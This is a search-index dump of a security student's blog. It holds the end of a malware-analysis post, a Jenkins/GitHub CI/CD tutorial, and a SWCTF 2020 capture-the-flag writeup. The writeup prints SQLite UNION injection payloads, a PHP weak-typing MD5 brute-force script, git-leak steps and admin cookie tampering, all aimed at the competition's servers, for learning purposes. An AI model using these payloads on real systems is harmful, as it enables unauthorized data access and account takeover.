12/87 detection rate - definitely malicious domain. Later appeared random domain names, likely DGA-generated for connecting to Amazon EC2, the C2 Server mentioned earlier. With actual internet connection, DNS queries narrowed to google.com, supnewdmn[.]com, and random domain names. From Process Hacker’s connection on Port 447, since packets use TCP, Wireshark couldn’t show content QQ ","date":"2021-07-21","objectID":"/en/posts/2021/my-first-malware-study/:2:5","series":null,"tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] A Wild Malware Appeared!","uri":"/en/posts/2021/my-first-malware-study/#wireshark"},{"categories":["Cyber Security"],"content":" In the EndThe malware analysis clearly shows the program originated from cheat engine, just with added payload (image from CAPE Sandbox Screenshot). Story continuation: turns out @stavhaygn’s friend used VPN through school network and downloaded a private server cheat bundled with a worm. School IPS traced malicious traffic IP to our lab’s server. The lesson: choose friends wisely don’t do bad things on school network. Finally, a simple diagram of this analysis. What the malware got from the C2 server and what it did remains unknown QwQ. But I think next step with reverse engineering should reveal more. ","date":"2021-07-21","objectID":"/en/posts/2021/my-first-malware-study/:3:0","series":null,"tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] A Wild Malware Appeared!","uri":"/en/posts/2021/my-first-malware-study/#in-the-end"},{"categories":["Programming"],"content":"Jenkins and GitHub CI/CD integration tutorial notes","date":"2021-06-19","objectID":"/en/posts/2021/cicd-jenkins-with-github-note/","series":null,"tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github: When the Butler Meets the Octocat","uri":"/en/posts/2021/cicd-jenkins-with-github-note/"},{"categories":["Programming"],"content":" Nice question. ","date":"2021-06-19","objectID":"/en/posts/2021/cicd-jenkins-with-github-note/:0:0","series":null,"tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github: When the Butler Meets the Octocat","uri":"/en/posts/2021/cicd-jenkins-with-github-note/#"},{"categories":["Programming"],"content":" Some MurmuringThis semester I took a course called “Cloud Big Data Infrastructure Practice” - completely outside my graduation credit requirements. The name doesn’t matter; the highlight is it’s a new course co-offered by the school and TSMC. The content features tech sharing from major companies partnering with TSMC, including Cisco, Aruba, VMware, Red Hat, Splunk, Oracle, and SAS. The first class was packed with auditors, and many from our lab enrolled too. The midterm and final group project topic was “How to build a highly stable, efficient cloud service with minimal construction and operation costs”. Originally we could just imagine a system and present, but during topic discussion, @stavhaygn said “Huh, I’d rather do something implementable”, sealing our fate to a difficult path (lol) Note 💡 Project is on MacacaHub Github, named “EVERCTF” after the “Ever Given” incident. Not sure if we’ll have time to continue development QQ So the team split into presentation and implementation groups, led by me and @stavhaygn respectively. Topic: “Implementing Highly Stable Automated CTF Competition Platform Deployment Using Infrastructure as Code Principles”. With half the members rushing their master’s theses, I didn’t expect implementation to complete - just go as far as possible XD Now, with implementation teammates in thesis crunch mode, and me being interested in the DevOps aspects, I’m studying Jenkins while preparing the final presentation. What about my thesis? Let’s not talk about sad things. Anyway, below are notes on CI/CD using Github and Jenkins Pipeline. Limited research time - please correct any bugs in terminology! ","date":"2021-06-19","objectID":"/en/posts/2021/cicd-jenkins-with-github-note/:1:0","series":null,"tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github: When the Butler Meets the Octocat","uri":"/en/posts/2021/cicd-jenkins-with-github-note/#some-murmuring"},{"categories":["Programming"],"content":" Introduction“CI/CD” stands for (Continuous Integration / Continuous Deployment or Continuous Delivery). I think this technology that automates the entire development flow - building, testing, deploying - is a crucial breakthrough in tech. While everyone writes scripts for repetitive tasks, fully automating everything is another matter XD Jenkins is a veteran Java-based CI/CD service with countless online introductions, especially in iThome challenges. I won’t spend time introducing it here. Also, this post focuses on CI/CD notes for the EVERCTF system design, so I won’t elaborate on other tools (otherwise discussing Git, Docker, etc. would take multiple posts XDDDDD). ","date":"2021-06-19","objectID":"/en/posts/2021/cicd-jenkins-with-github-note/:2:0","series":null,"tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github: When the Butler Meets the Octocat","uri":"/en/posts/2021/cicd-jenkins-with-github-note/#introduction"},{"categories":["Programming"],"content":" System overviewLet me explain EVERCTF’s CI/CD workflow : 3 Below is our planned Jenkins Pipeline. Challenge creators push to Github (Push/PR), triggering Jenkins for checks, pushing Docker images to registry, then K8s handles testing and deployment. Below is the expected data structure, though there’s room for improvement based on challenge requirements. bash . (workspace) +- jenkinsfile +- challenges +- pwn +- pwn1 +- config.yaml +- Dockerfile +- exploit.py +- blahblahblah... +- pwn2 +-web +- web1 +- config.yaml +- Dockerfile +- html +- index.html +- blahblahblah... +- exploit +- Dockerfile +- exploit.py +- web2 ","date":"2021-06-19","objectID":"/en/posts/2021/cicd-jenkins-with-github-note/:2:1","series":null,"tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github: When the Butler Meets the Octocat","uri":"/en/posts/2021/cicd-jenkins-with-github-note/#system-overview"},{"categories":["Programming"],"content":" ConfigureSince I usually only use small tools(?), tools requiring setup/authentication are challenging. Spent lots of time on tutorials. ","date":"2021-06-19","objectID":"/en/posts/2021/cicd-jenkins-with-github-note/:3:0","series":null,"tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github: When the Butler Meets the Octocat","uri":"/en/posts/2021/cicd-jenkins-with-github-note/#configure"},{"categories":["Programming"],"content":" Environment Note Testing environment: Ubuntu 18.04 and MacOS 10.15 (Jenkins version: jenkinsci/blueocean:1.24.7) Jenkins Docker installation: bash $ docker run \\ --name jenkins-blueocean \\ -d \\ -u root \\ -p 9000:8080 \\ -v jenkins-data:/var/jenkins_home \\ -v /var/run/docker.sock:/var/run/docker.sock \\ jenkinsci/blueocean Parameter explanation: line 2: Custom image name line 3: Run container in background line 4: Login as root line 5: Map container port 8080 to host port 9000 line 6: Mount host jenkins-data(volume) to container /var/jenkins_home line 7: Let Jenkins operate other host containers, avoiding docker-in-docker line 8: Docker image from DockerHub jenkinsci/blueocean Regarding line 8’s image: while Jenkins officially has jenkinsci/jenkins as the “official” image(?), the User Handbook recommends jenkinsci/blueocean with Blue Ocean UI - basically the official UI was too ugly too traditional, so new UI was added (lol). After successful docker run, verify with docker ps -a. Accessing 127.0.0.1:9000 requires Unlock Jenkins - get password directly from Jenkins Container: bash $ docker exec -it jenkins-blueocean cat /var/jenkins_home/secrets/initialAdminPassword Select left option for plugin installation, including Github plugin we’ll use later. Click through remaining setup! ","date":"2021-06-19","objectID":"/en/posts/2021/cicd-jenkins-with-github-note/:3:1","series":null,"tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github: When the Butler Meets the Octocat","uri":"/en/posts/2021/cicd-jenkins-with-github-note/#environment"},{"categories":["Programming"],"content":" Github WebhookReference: Trigger Local Jenkins Pipeline via GitHub Webhook For Github to trigger Jenkins CI/CD, Jenkins needs an external Domain/IP. Without a static IP, use ngrok to generate a domain. Note the port is 9000 from Docker run. Skip ngrok if you have a static IP. bash $ ./ngrok http 9000 In desired repo \u003e Settings \u003e Webhooks \u003e Add webhook: After adding Webhook, check “Recent Deliveries” at bottom - green checkmark means success. Note: closing ngrok requires reconfiguring Webhook (so I just use lab’s static IP). Besides Webhook, authentication is needed. Since our project uses Private Repository, there are multiple authentication methods. Reference: Jenkins - Build a Private GitHub Repo - very detailed. For key generation, I used ed25519 - shorter keys. ssh-keygen location isn’t confirmed; I did it in Jenkins Docker, though the point is just generating keypair, maybe creating /.ssh/ directory(?). bash $ docker ps -a $ docker exec -it jenkins-blueocean bash bash# ssh-keygen -t ed25519 -C \u003ce-mail\u003e Generating public/private ed25519 key pair. Enter file in which to save the key (/root/.ssh/id_ed25519): # Press Enter Enter passphrase (empty for no passphrase): # Press Enter Enter same passphrase again: # Press Enter bash# cat /root/.ssh/id_ed25519.pub ssh-ed25519 blahblahblahblahblahblahblahblahblahblahblahblahblah bash# cat /root/.ssh/id_ed25519 -----BEGIN OPENSSH PRIVATE KEY----- blahblahblahblahblahblahblahblahblahblahblahblah ... -----END OPENSSH PRIVATE KEY----- Github gets public key (left), Jenkins gets private key (right). Warning Above scenario is Private Repository with self-push. For team collaboration with pull requests (PR), credentials should be set from repo owner’s account “Settings \u003e Developer settings \u003e Personal access tokens”. ","date":"2021-06-19","objectID":"/en/posts/2021/cicd-jenkins-with-github-note/:3:2","series":null,"tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github: When the Butler Meets the Octocat","uri":"/en/posts/2021/cicd-jenkins-with-github-note/#github-webhook"},{"categories":["Programming"],"content":" Jenkins Theme (optional)Reference jenkins-material-theme - just changing to a nicer theme. ","date":"2021-06-19","objectID":"/en/posts/2021/cicd-jenkins-with-github-note/:3:3","series":null,"tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github: When the Butler Meets the Octocat","uri":"/en/posts/2021/cicd-jenkins-with-github-note/#jenkins-theme-optional"},{"categories":["Programming"],"content":" Jenkins Language (optional)Jenkins via Browser surprisingly shows Chinese interface - it follows Browser language settings. Unfortunately it’s half-baked Chinese, mixed with English(?). Comparing with English tutorials becomes painful, so I looked up how to change language. Dashboard \u003e (left) Manage Jenkins \u003e Manage Plugins \u003e (Available) search locale and install. After restarting Jenkins: Dashboard \u003e (left) Manage Jenkins \u003e Configure System \u003e find Locale’s default language, enter ENGLISH or us, and check “Ignore browser preference and force this language to all users”. ","date":"2021-06-19","objectID":"/en/posts/2021/cicd-jenkins-with-github-note/:3:4","series":null,"tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github: When the Butler Meets the Octocat","uri":"/en/posts/2021/cicd-jenkins-with-github-note/#jenkins-language-optional"},{"categories":["Programming"],"content":" Jenkins Freestyle Project 🏆GOAL Trigger Jenkins to compile and run cpp via push to Github private repository. Let’s start with a simple project. Go to “New Item \u003e Freestyle project”. In Source Code Management(SCM), select “Git”. Note: “Repository URL” needs SSH format for Private Repository. The system immediately tests access (showing ERROR) - select our credential from “Credentials” dropdown. Also note “Branch Specifier” (default */master) - due to 2020 Black Lives Matter movement, Github changed default branch from master to main. See this iThome article. In Build Triggers, check “GitHub hook trigger for GITScm polling” - Jenkins triggers on Github Push. From Github plugin: “If Jenkins will receive PUSH GitHub hook from repo defined in Git SCM section it will trigger Git SCM polling logic.” Finally, in Build select Execute shell - have Jenkins compile and run .cpp: bash echo \"Oh, It works!!!\" ls -a cd $WORKSPACE/job-sample g++ -std=c++17 main.cpp -o main.out ./main.out Try pushing job-sample/main.cpp locally to see if Jenkins runs! You should see records in Build History on the left, then… failure w Two ways to view Jenkins Build: native GUI’s Build History (left), or Blue Ocean GUI from jenkinsci/blueocean - looks slightly better XD Why failed? Error logs show g++: not found - project dependencies need installation in Jenkins (jenkinsci/blueocean is based on Apache Maven, so use apk). bash $ docker ps -a $ docker exec -it jenkins-blueocean bash bash-5.1# apk add g++ bash-5.1# g++ -v After installing g++, retry via “Build Now” (native GUI) or “Run” (Blue Ocean GUI). Success! (Below is Blue Ocean GUI) ","date":"2021-06-19","objectID":"/en/posts/2021/cicd-jenkins-with-github-note/:4:0","series":null,"tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github: When the Butler Meets the Octocat","uri":"/en/posts/2021/cicd-jenkins-with-github-note/#jenkins-freestyle-project"},{"categories":["Programming"],"content":" Jenkins PipelineThe Freestyle project above suits single-task small projects - insufficient for our project. Next: Jenkins pipeline using Jenkinsfile! 🏆GOAL Trigger Jenkins pipeline via push to Github private repository, build Docker image and push to Harbor registry. First, install Docker Pipeline Plugins. Then “New Item \u003e Freestyle project” with similar notes: Build Triggers: select “GitHub hook trigger for GITScm polling” Pipeline: Select Pipeline script from SCM \u003e Git Paste SSH format Repository URL Branch: note */main Script Path: in project root, default Jenkinsfile Next we need a Docker registry for uploads. Most think of DockerHub, but our challenges need private registry, so Harbor registry fits better. Setup reference: this iThome article. Note During experiments, discovered Harbor can’t run HTTP-only, so spent time learning Let’s Encrypt self-signed certificates for HTTPS. Really a web dev newbie XD After successfully running Harbor, set Jenkins Credentials for pushing Docker images to Harbor. Add credentials similar to webhook setup - this time “Username with password”, not SSH. Note the ID field becomes the environment variable in Jenkinsfile for pushing images during Jenkins triggers. Finally, the Jenkinsfile highlight! Honestly this was hard to write. Jenkins pipeline has two syntaxes - Scripted and Declarative pipeline - no unified format, like a chimera QQ. First-timers spend lots of time finding sample code. For syntax details: Mastering Jenkins Pipeline — part1 (Groovy and Jenkinsfile) - very comprehensive series. Sample code: simple-flask - generates a webpage and tests content correctness. Test failure case below - extra Meow~ (meow meow meow) Test success finally pushes Docker image to Harbor~ Push location: \u003c harbor domain \u003e/\u003c harbor projects\u003e. Docker image can be \u003c image name \u003e/\u003c your name \u003e without creating new directory (mentioning because I thought otherwise XD). Finally, the Jenkinsfile - probably needs no comments… right? groovy pipeline { environment { // setting in Jenkins credential REGISTRY_CREDENTIAL = \"harbor-credential\" } /* I'm not sure about the variable scoping rules in the Groovy language, so I write in setup stage as coded below. parameters { string (name: 'DOCKER_REG', defaultValue: \"registry.eevee.tw/lab\", description: 'Docker registry') string (name: 'IMAGE_NAME', defaultValue: \"app/yctseng\", description: 'Docker image name') } */ agent any stages { stage(\"Setup\") { steps { sh \"docker version\" script { DOCKER_REG = \"registry.eevee.tw/lab\" IMAGE_NAME = \"app/yctseng\" } } } stage(\"Build Docker Image\") { steps { dir(\"simple-flask\") { script { ImageName = \"${DOCKER_REG}/${IMAGE_NAME}\" DockerImage = docker.build(ImageName) } } } } stage(\"Test Docker Image\") { steps { sh \"docker run --rm ${DOCKER_REG}/${IMAGE_NAME} flask test\" } } stage(\"Push Docker Image\") { steps { script { docker.withRegistry(\"https://${DOCKER_REG}\", REGISTRY_CREDENTIAL) { DockerImage.push(\"latest\") } } echo \"Remove unused images\" sh \"docker rmi ${DOCKER_REG}/${IMAGE_NAME}\" } } } } My scope ends here. @stavhaygn takes over with Kubernetes (K8s) CI/CD - his final Jenkins was more complex than mine XD. But we agreed: next time we won’t use Jenkins for CI/CD. While being a veteran means more resources, the lack of unified format causes much confusion in writing styles. No wonder some articles use Jenkins with ansible to avoid hassle - smart move XD ","date":"2021-06-19","objectID":"/en/posts/2021/cicd-jenkins-with-github-note/:5:0","series":null,"tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github: When the Butler Meets the Octocat","uri":"/en/posts/2021/cicd-jenkins-with-github-note/#jenkins-pipeline"},{"categories":["Programming"],"content":" Syntax Error in Jenkinsfile?Recommended VSC Extension: Jenkins Pipeline Linter Connector - no need to push to Github before discovering compiler errors from Jenkins. After installation, configure Jenkins username/password/url in VSC settings, then use ctrl/cmd+shift+p or default shift+alt/option+v to check. ","date":"2021-06-19","objectID":"/en/posts/2021/cicd-jenkins-with-github-note/:5:1","series":null,"tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github: When the Butler Meets the Octocat","uri":"/en/posts/2021/cicd-jenkins-with-github-note/#syntax-error-in-jenkinsfile"},{"categories":["Cyber Security"],"content":"SWCTF 2020 CTF competition writeups","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/"},{"categories":["Cyber Security"],"content":"First post of 2021!! Happy New Year~ This SWCTF was jointly designed by Feng Chia University Hacker Club, Providence University Xingyvnzhe R\u0026D Base, and Taichung University of Science and Technology Computer Research Club. Still busy with my thesis, but thinking about the upcoming AIS3-EOF, I decided to practice a bit. Quick notes on challenges I got stuck on or found interesting(?) for the first time. Though Crypto was really about guessing - quite headache-inducing QQ Thanks @stavhaygn and @MuMu for post-competition clarification wwwww Official writeup: https://hackmd.io/@swctf/writeups Attaching proof - roughly half of Rank 1’s score. I’m so bad QQ Some guessing challenges and flag case sensitivity ruined my accuracy wwwww ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:0:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#"},{"categories":["Cyber Security"],"content":" NOKIA 3310 (Providence-Crypto, Score: 200)Do you know how to text on a phone? text 626352432143742174713223432153619381428142218193638252626391 Group digits by twos - button \u0026 number of presses. SWCTF{NOKIAISASPECIALMYTHTHATYOUKNOW} (Got WA once due to case sensitivity ==) ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:1:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#nokia-3310-providence-crypto-score-200"},{"categories":["Cyber Security"],"content":" A letter (Providence-crypto, Score: 200)Hey! Remember the “unbreakable cipher” you told me about when we first met? This time I put the key content in this poem. Perhaps you can decode what I want to tell you. Released file (pdf) Opening the PDF shows a ciphertext string. I’ll help you type it out ^_^ text Kzwrsomklpp_Evfvtukb_ju_mj_hyvqevjxq_rqe_rdfipwzu_dt_Etzqfuq The “unbreakable cipher” mentioned leads to Vigenère cipher via Google. With ciphertext… where’s the key? The PDF actually has few clues. Taking CMRDB from upper-left as key and throwing it into Cryptii gives the Flag XD SWCTF{Information_Security_is_as_extensive_and_profound_as_Chinese} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:2:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#a-letter-providence-crypto-score-200"},{"categories":["Cyber Security"],"content":" MOS (Providence-crypto, Score: 275)Your senior colleague is leaving. During handover, they give you an encrypted USB and two Morse code strings. “These contain our treasured collection - decrypt it and pass it on!!” Please use uppercase Second line is the key %u7b is “{” %u7d is “}” text .-.. ...- . --.. -.-- ----.-- .--- .---- .- --- -..- --- --. ----- -.- -.... -.-- .-.. -.-. .--- .--.-. --... -.-- .. -..- .-.. -----.- --.- .-- . .-. - -.-- ..- .. --- .--. .- ... -.. ..-. --. .... .--- -.- .-.. --.. -..- -.-. ...- -... -. -- Title says Morse code, with many hints. Find an online tool to decode: text LVEZY#J1AOXOG0K6YLCJ@7YIXL# QWERTYUIOPASDFGHJKLZXCVBNM Initially thought line 2 was Vigenère cipher key… it’s not - it maps to alphabet XD text A B C D E F G H I J K L M N O P Q R S T U V W X Y Z ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ Q W E R T Y U I O P A S D F G H J K L Z X C V B N M Keep numbers and special characters, decode and format as Flag = w = SWCTF{Q1KIUIO0R6FSVQ@7FHUS} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:3:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#mos-providence-crypto-score-275"},{"categories":["Cyber Security"],"content":" Base-X (Feng Chia-Crypto, Score: 200)Heard hackers encode messages while chatting text wpZTV0NURntCYXNlNjRfdEhlX0xhTkdVNDZlX09mX2g0Q2szcnN9Cg== No nonsense, Base64. bash $ echo \"wpZTV0NURntCYXNlNjRfdEhlX0xhTkdVNDZlX09mX2g0Q2szcnN9Cg==\" | base64 --decode SWCTF{Base64_tHe_LaNGU46e_Of_h4Ck3rs} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:4:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#base-x-feng-chia-crypto-score-200"},{"categories":["Cyber Security"],"content":" Can’t Tell Left from Right (Feng Chia-Crypto, Score: 200)Urban legend: Running 1600 meters around the track at 3 AM brings you back to start ~(\u003e_\u003c。)＼ text RVBSE{QNS_5TooNQsr_tOO3q_KNvdQbzRd} Caesar cipher. Recommend this useful site: https://planetcalc.com/1434/ SWCTF{ROT_5UppORts_uPP3r_LOweRcaSe} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:5:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#cant-tell-left-from-right-feng-chia-crypto-score-200"},{"categories":["Cyber Security"],"content":" N=pq (Feng Chia-Crypto, Score: 200)RSA is world-famous encryption algorithm. Using large N as encryption parameter should be secure? Whatever, nobody can break my encrypted flag : ) text N = pq = 16857159784242147958930006036274524315067659003347665436247836447121615960042560515473548747696129683 e = 65537 encrypted_flag = 4133875657690452080396474983972067706781976275589651694439550567678165824984290994659861724649235686 Find an RSA online tool. Of course, writing your own tool is better www Result: text (Decimal) 37696146816110213689299726858207805170794163239535976391601058414329946927997 (Hex) 53574354467B695F64306E375F6B6E6F775F686F775F5253415F576F726B737D (ASCII text) SWCTF{i_d0n7_know_how_RSA_Works} The Decimal result gave many WAs. A friend explained it needs Hex conversion first for ASCII. Not sure why the extra step is needed = w = Normally RSA challenges just wrap Decimal in Flag format, right? QQ SWCTF{i_d0n7_know_how_RSA_Works} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:6:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#npq-feng-chia-crypto-score-200"},{"categories":["Cyber Security"],"content":" Advanced SQL Injection (Providence-Web, Score: 200)Following TIM’s footsteps, Xiaoming continues researching SQL Injection. Heard there’s a Union attack technique http://swctf.hackersir.org:20000/ Initially guessed admin:admin - accidentally logged in successfully showing: text Hi, admin The flag is in the database. (Post-competition found this credential in F12 source code XD) Recently practiced similar UNION challenges from NSYSU Hacking Attack \u0026 Defense HW 0x02 Writeups, similar approach. First ' ORDER BY 1 -- - errors at 5, database is SQLite3. Then use UNION SELECT with SQLite Injection to extract Flag. Note: logged-in page only shows second column - our target. text // Find version: 3.27.2 ' UNION SELECT NULL,sqlite_version(),NULL,NULL FROM sqlite_master -- // Find table name: flag ' UNION SELECT NULL,tbl_name,NULL,NULL FROM sqlite_master -- // Guess and grab flag from table flag... Bingo!! ' UNION SELECT NULL,flag,NULL,NULL FROM flag -- Skipped many steps - basically trying various approaches www SWCTF{c0ngratu1ati0n5_u_find_th3_f1ag} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:7:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#advanced-sql-injection-providence-web-score-200"},{"categories":["Cyber Security"],"content":" 🐘 (Providence-Web, Score: 200)PHP is the best language in the world http://swctf.hackersir.org:20003/ Simple challenge testing PHP weak typing bypass. php substr(md5(\"CMRDB\" . \"Your Answer\"), 0, 6) == md5(\"s1885207154a\") CMRDB scared me - must brute force!? @stavhaygn passing by said there should be a tool (none found), wrote the code directly == python import hashlib import random import string import re while True: answer = \"\".join(random.choices(string.ascii_uppercase + string.digits, k=4)) md5 = hashlib.md5() md5.update(f\"CMRDB{answer}\".encode()) value = md5.hexdigest() match = re.match(r\"0e\\d{4}\", value) if match: print(answer, value) Brute forcing isn’t hard - many answers (k=4 gives many) text C1Q5 0e51348aeac13f5a8bb7ba82d82a7395 XFPP 0e42173960df205b0920e0143b01a837 ... k=2 gives one solution (3D), input directly for Flag. SWCTF{n0w_u_kn0w_wh@t_15_md5} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:8:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#-providence-web-score-200"},{"categories":["Cyber Security"],"content":" Git (Providence-Web, Score: 200)Xiaoming is learning web security, using git for version control. http://swctf.hackersir.org:20001/ Clearly git, but /.git/ returned 404 (?) Tried /git/ - got 403 Forbidden. Use GitHacker to leak files. Note P.S. Organizers fixed this during competition - probably couldn’t have two .git on Github, forgot to rename after pull XD bash $ git log --oneline 8266d82 (HEAD -\u003e master) add my first website page and delete flag.txt aa54633 add flag.txt Previous version added Flag, just revert. bash $ git reset --hard HEAD~1 SWCTF{g1t_13ak_15_easy} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:9:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#git-providence-web-score-200"},{"categories":["Cyber Security"],"content":" матрёшка_1 (NUTC-Misc, Score: 200)There are too many fake files and fake folders, I think scripting languages can help. Released file (zip) Downloaded file is ~20 MB. zipinfo shows tons of Flag directories - needle in haystack. Tip P.S. Unknown compressed files may contain Zip bomb Simple command gets the Flag. bash grep -rn '.' -e 'CTF' I usually use -rnw though, which weirdly failed here. Finally used VSCode’s built-in search XDDDD SWCTF{SH4D0W_CL0N3_JUT5U!!!} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:10:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#матрёшка_1-nutc-misc-score-200"},{"categories":["Cyber Security"],"content":" матрёшка_2 (NUTC-Misc, Score: 200)Do you know how to unzip this quickly? Released file (zip) Recursive decompression basic challenge. Still not great at shell scripts, should practice. This time learned PowerShell from a junior - without abbreviations looks professional (X) Should practice decompression challenges during break, can’t always rely on teammates QQ ps1 while($?){ Expand-Archive *.zip -DestinationPath ./Zip Remove-Item *.zip Move-Item Zip/* ./ } Final result is an image with base64 - manual decode needed == SWCTF{ZIP_FILE_1S_SUCK!!} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:11:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#матрёшка_2-nutc-misc-score-200"},{"categories":["Cyber Security"],"content":" code (NUTC-Crypto, Score: 200)1 and 0 can represent everything text 1111111011101011001111111 1000001001100111001000001 ... 1111111011010101110001001 Originally no clue. Viewed from afar - it’s QR code XD Drew with Python, junior used MS Word blocks. Then realized - there should be tools… binary-to-qrcode Lol. SWCTF{QRRQRRQQQQRRRQRRQR} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:12:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#code-nutc-crypto-score-200"},{"categories":["Cyber Security"],"content":" PNG (Providence-Misc, Score: 200)Your unit requires messages hidden in images. Image was corrupted during transmission. Please fix and find the message. Released file (Unknown) Downloaded file shows pure data via file, but title hints .png. Use hex editor with PNG wikipedia to restore header structure, check with pngcheck. After fixing, image opens… but not done XD Throw at image challenge universal site https://aperisolve.fr/ (or zsteg), Flag hidden in LSB. SWCTF{QTQi3NcgqFcB5RJNvyqe} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:13:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#png-providence-misc-score-200"},{"categories":["Cyber Security"],"content":" Loseless Flowers (Feng Chia-Misc, Score: 367)Enjoying flowers at home in winter isn’t bad, photos are so beautiful Released file (png) Throw at https://aperisolve.fr/ (or exiftool). ExifTool shows IFD0 with URL https://pastebin.com/AQ4WqdsQ and XMP-MICROSOFT has password x8U5@3HIZtMlmV@Upteu. Done. SWCTF{MY_CaMeRa_1s_Bet7er_tH4n_yOur5} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:14:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#loseless-flowers-feng-chia-misc-score-367"},{"categories":["Cyber Security"],"content":" CoolMD (Feng Chia-Web, Score: 200)No more boring notes https://hackmd.io/@swctf/CoolMD/ First time seeing HackMD challenge, F12 poke around gives Flag. SWCTF{coOL_CSsY_Cha7_r0om} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:15:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#coolmd-feng-chia-web-score-200"},{"categories":["Cyber Security"],"content":" Evil Robots (Feng Chia-Web, Score: 200)Robots take everything. What if they take the flag? http://swctf.hackersir.org:20200/ Simple Web, find directory /nguinwiuniueniuw/hawuohudsoihfifiofs.php from robots.txt. Done. SWCTF{d0nt_iNDex_7HE_Fl46} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:16:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#evil-robots-feng-chia-web-score-200"},{"categories":["Cyber Security"],"content":" Stupid Session (Feng Chia-Web, Score: 200)Really want to be admin, but only test account works… http://swctf.hackersir.org:20203/ Test credentials: test : test After login: “You received a private message from FBI, please login as admin to view!” Target cookies. Recommend Chrome extension EditThisCookie. URL decode login_info shows serialization structure: text a:1:{s:8:\"username\";s:4:\"test\";} Change test to admin! text a:1:{s:8:\"username\";s:5:\"admin\";} URL encode, modify cookie, green checkmark, F5 refresh. Flag. 